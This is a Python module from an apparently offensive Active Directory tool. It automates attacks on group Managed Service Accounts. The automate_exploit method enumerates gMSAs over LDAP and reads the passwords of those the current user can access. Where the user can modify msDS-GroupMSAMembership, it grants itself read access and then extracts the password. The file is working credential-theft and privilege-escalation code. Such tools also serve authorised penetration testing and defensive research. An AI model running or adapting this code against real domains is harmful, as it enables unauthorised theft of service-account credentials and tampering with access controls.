from gmsatool.commands.enum.find_gmsa import GMSAEnumerator
from gmsatool.commands.gmsa.read_password import GMSAReader
from gmsatool.commands.gmsa.access import GMSAMembership
from gmsatool.protocols.ldap import check_group_membership
from gmsatool.helpers.common import logger, bcolors


class GMSAAutomator:
    def __init__(self, domain, ldap_session):
        self.domain = domain
        self.dn = ",".join([f"dc={i}" for i in self.domain.split(".")])
        self.ldap_session = ldap_session
        self.user = self.ldap_session.extend.standard.who_am_i().split("\\")[-1]

    def automate_exploit(self):
        can_read_password = []
        can_modify_gmsa_membership = []

        gmsa_enumerator = GMSAEnumerator(self.domain, self.ldap_session)
        read_privileges, modify_privileges = gmsa_enumerator.get_gmsa_accounts()

        for entry in read_privileges:
            if "group" in entry["principal_type"]:
                if check_group_membership(self.ldap_session, self.dn, self.user, entry["principal_dn"]):
                    logger.info(f"{bcolors.OKGREEN}[+] {self.user} is a member of group {entry['principal']} {bcolors.ENDC}")
                    can_read_password.append(entry["gmsa"])
                    logger.info(f"{bcolors.OKGREEN}[+] {entry['principal']} can read the gMSA password for {entry['gmsa']} {bcolors.ENDC}")
            else:
                if entry["principal"].lower() == self.user.lower():
                    can_read_password.append(entry["gmsa"])
                    logger.info(f"{bcolors.OKGREEN}[+] {entry['principal']} can read the gMSA password for {entry['gmsa']} {bcolors.ENDC}")

        for entry in modify_privileges:
            if "group" in entry["principal_type"]:
                if check_group_membership(self.ldap_session, self.dn, self.user, entry["principal_dn"]):
                    logger.info(f"{bcolors.OKGREEN}[+] {self.user} is a member of group {entry['principal']} {bcolors.ENDC}")
                    can_modify_gmsa_membership.append(entry["gmsa"])
                    logger.info(f"{bcolors.OKGREEN}[+] {entry['principal']} can modify the msDS-GroupMSAMembership attribute for {entry['gmsa']} {bcolors.ENDC}")
            else:
                if entry["principal"].lower() == self.user.lower():
                    can_modify_gmsa_membership.append(entry["gmsa"])
                    logger.info(f"{bcolors.OKGREEN}[+] {entry['principal']} can modify the msDS-GroupMSAMembership attribute for {entry['gmsa']} {bcolors.ENDC}")

        for target in can_read_password:
            gmsa_reader = GMSAReader(self.domain, target, self.ldap_session)
            gmsa_reader.read_gmsa_password()

        for target in can_modify_gmsa_membership:
            gmsa_membership = GMSAMembership(self.domain, target, self.user, self.ldap_session)
            gmsa_membership.add_readgmsapassword_access()

            gmsa_reader = GMSAReader(self.domain, target, self.ldap_session)
            gmsa_reader.read_gmsa_password()
